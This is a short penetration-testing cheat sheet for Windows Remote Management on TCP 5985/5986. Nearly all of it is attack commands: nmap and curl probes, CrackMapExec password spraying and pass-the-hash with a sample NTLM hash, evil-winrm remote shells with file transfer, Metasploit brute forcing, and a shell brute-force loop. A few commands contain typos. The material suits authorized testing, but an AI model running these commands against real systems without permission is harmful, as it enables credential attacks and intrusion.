# WinRM (Windows Remote Management) — TCP/5985, TCP/5986


## Detection

### nmap
```
nmap -p 5985,5986 -sV <IP>
nmap -p 5985 --script http-winrm-info <IP>
```

## Banner Grabbing

### Using netcat
```
nc -vn target.com 5985
```

### Using cURL
```
url http://target.com:5985/wsman

curl -H "Content-Type: application/soap+xml;charset=UTF-8" \
  http://target.com:5985/wsman \
  -d '<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"><s:Header/><s:Body><wsmid:Identify/></s:Body></s:Envelope>'
```

### Using nmap
```
# Detect WinRM version
nmap -p 5985,5986 -sV target.com

# Enumerate HTTP methods and headers
nmap -p 5985 --script http-methods target.com
nmap -p 5985 --script http-headers target.com

# Check WinRM configuration
nmap -p 5985,5986 --script http-wsman-info target.com
```

## Authentication Testing

### CrackMapExec 

#### Authentication check
```
crackmapexec winrm <IP> -u users.txt -p passwords.txt
```

#### Password spray
```
crackmapexec winrm <IP> -u users.txt -p 'Winter2024!'
```

#### Pass-the-Hash
```
crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

### Execute Command
```
rackmapexec winrm <IP> -u <username> -p <password> -x "whoami
```

## Remote Access 

### Evil-winrm

```
evil-winrm -i <IP> -u user -p password
```

#### Domain user
```
evil-winrm -i <IP> -u user -d DOMAIN -p password
```

#### Using NTLM Hash (Pass-the-Hash)
```
evil-winrm -i <IP> -u user -H <NTLM_HASH>
```

#### Kerberos
```
evil-winrm -i <IP> -r DOMAIN.LOCAL
```

#### Evil-winrm Built-in commands for file transfer
```
upload localfile.exe C:\Temp\file.exe
download C:\Temp\file.txt
```

## Brute Force Attack

### CracKmapExec
```
crackmapexec winrm target.com -u users.txt -p passwords.txt
```

### Metasploit
```
use auxiliary/scanner/winrm/winrm_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Custom script
```
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    echo "Trying $user:$pass"
    evil-winrm -i target.com -u "$user" -p "$pass" -e /tmp/test
  done
done
```